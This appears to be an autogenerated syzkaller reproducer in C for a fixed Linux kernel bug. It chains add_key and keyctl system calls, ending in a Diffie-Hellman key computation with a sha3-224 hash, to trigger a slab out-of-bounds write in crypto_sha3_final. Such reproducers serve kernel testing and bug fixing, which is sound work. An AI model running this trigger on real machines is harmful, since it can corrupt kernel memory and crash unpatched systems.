// KASAN: slab-out-of-bounds Write in crypto_sha3_final
// https://syzkaller.appspot.com/bug?id=84a6b6d052a9d8c9277e353dcaf7ec156d8e6ae5
// status:fixed
// autogenerated by syzkaller (http://github.com/google/syzkaller)

#define _GNU_SOURCE
#include <endian.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

uint64_t r[5] = {0x0, 0x0, 0x0, 0x0, 0x0};
void loop()
{
  long res = 0;
  memcpy((void*)0x20000340, "keyring", 8);
  *(uint8_t*)0x20000380 = 0x73;
  *(uint8_t*)0x20000381 = 0x79;
  *(uint8_t*)0x20000382 = 0x7a;
  *(uint8_t*)0x20000383 = 0;
  *(uint8_t*)0x20000384 = 0;
  res = syscall(__NR_add_key, 0x20000340, 0x20000380, 0, 0, 0xfffffffe);
  if (res != -1)
    r[0] = res;
  memcpy((void*)0x20000400, "keyring", 8);
  *(uint8_t*)0x200003c0 = 0x73;
  *(uint8_t*)0x200003c1 = 0x79;
  *(uint8_t*)0x200003c2 = 0x7a;
  *(uint8_t*)0x200003c3 = 0;
  *(uint8_t*)0x200003c4 = 0;
  res = syscall(__NR_add_key, 0x20000400, 0x200003c0, 0, 0, r[0]);
  if (res != -1)
    r[1] = res;
  memcpy((void*)0x200000c0, "keyring", 8);
  *(uint8_t*)0x20000180 = 0x73;
  *(uint8_t*)0x20000181 = 0x79;
  *(uint8_t*)0x20000182 = 0x7a;
  *(uint8_t*)0x20000183 = 0;
  *(uint8_t*)0x20000184 = 0;
  res = syscall(__NR_add_key, 0x200000c0, 0x20000180, 0, 0, r[1]);
  if (res != -1)
    r[2] = res;
  memcpy((void*)0x203bd000, "user", 5);
  *(uint8_t*)0x20000280 = 0x73;
  *(uint8_t*)0x20000281 = 0x79;
  *(uint8_t*)0x20000282 = 0x7a;
  *(uint8_t*)0x20000283 = 0;
  *(uint8_t*)0x20000284 = 0;
  memcpy((void*)0x20000440, "", 1);
  res = syscall(__NR_add_key, 0x203bd000, 0x20000280, 0x20000440, 1, r[2]);
  if (res != -1)
    r[3] = res;
  memcpy((void*)0x20fc0ffb, "user", 5);
  *(uint8_t*)0x20752ffb = 0x73;
  *(uint8_t*)0x20752ffc = 0x79;
  *(uint8_t*)0x20752ffd = 0x7a;
  *(uint8_t*)0x20752ffe = 0x23;
  *(uint8_t*)0x20752fff = 0;
  memcpy((void*)0x203eb000, "\x02", 1);
  res = syscall(__NR_add_key, 0x20fc0ffb, 0x20752ffb, 0x203eb000, 1, r[2]);
  if (res != -1)
    r[4] = res;
  memcpy((void*)0x20000480,
         "\xdf\x02\x75\x46\x77\x21\x2d\xfc\x3e\x2a\xcc\x26\xfd\xc3\xff\xa6\x48"
         "\x13\xda\x49\x41\x37\xe1\x75\xe9\xf2\x78\x0a\xc5\xe2\xa0\x9f\x43\xa1"
         "\xfc\xeb\xf2\x72\xa5\xa1\x35\xde\x92\xbf\x4a\x90\x33\x93\x38\x24\xf6"
         "\xe6\xaa\x02\x38\x95\x11\x32\x93\x53\x5d\x1c\x00\x66\xd2\x0e\x0f\x27"
         "\x51\x88\xb4\xb4\xc1\x87\xe1\x87\x74\xfc\x22\x27\xcb\xb6\x0f\xc6\x69"
         "\x7f\x53\x37\x72\x61\x64\xc8\xfb\xe1\x18\x1e\x6d\x50\x98\x6c\xd9\x8a"
         "\x5c\x44\xac\x0e\xc3\x75\xde\xb2\x7e\xaf\xcf\x7d\x06\x43\x8f\x25\x25"
         "\x10\xd8\x7b\xd9\x1d\x03\xe7\xdc\x2f\xae\xd8\x5a\xdc\xd8\x8c\xa3\x0e"
         "\x75\xb1\xe1\x43\xa7\x2d\x94\xde\xfa\x18\x7e\x48\xb8\x9e\xfb\xbb\xcc"
         "\x9b\x9a\x9a\x30\x73\x53\xdf\x7a\x21\xaf\xfc\xe4\xe9\x14\x9e\xb1\x22"
         "\xcb\xc3\x56\xcb\x68\x13\x65\xaf\xd9\x79\xe9\x7b\x57\xb5\x96\xe9\x01"
         "\x86\x4a\x68\x67\x9f",
         192);
  syscall(__NR_keyctl, 2, r[4], 0x20000480, 0xc0);
  *(uint32_t*)0x200001c0 = r[4];
  *(uint32_t*)0x200001c4 = r[4];
  *(uint32_t*)0x200001c8 = r[3];
  *(uint64_t*)0x20000200 = 0x20000140;
  memcpy((void*)0x20000140,
         "\x73\x68\x61\x33\x2d\x32\x32\x34\x2d\x67\x65\x6e\x65\x72\x69\x63\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
         64);
  *(uint64_t*)0x20000208 = 0;
  *(uint32_t*)0x20000210 = 0;
  *(uint32_t*)0x20000214 = 0;
  *(uint32_t*)0x20000218 = 0;
  *(uint32_t*)0x2000021c = 0;
  *(uint32_t*)0x20000220 = 0;
  *(uint32_t*)0x20000224 = 0;
  *(uint32_t*)0x20000228 = 0;
  *(uint32_t*)0x2000022c = 0;
  *(uint32_t*)0x20000230 = 0;
  syscall(__NR_keyctl, 0x17, 0x200001c0, 0x20000080, 0x59, 0x20000200);
}

int main()
{
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  loop();
  return 0;
}
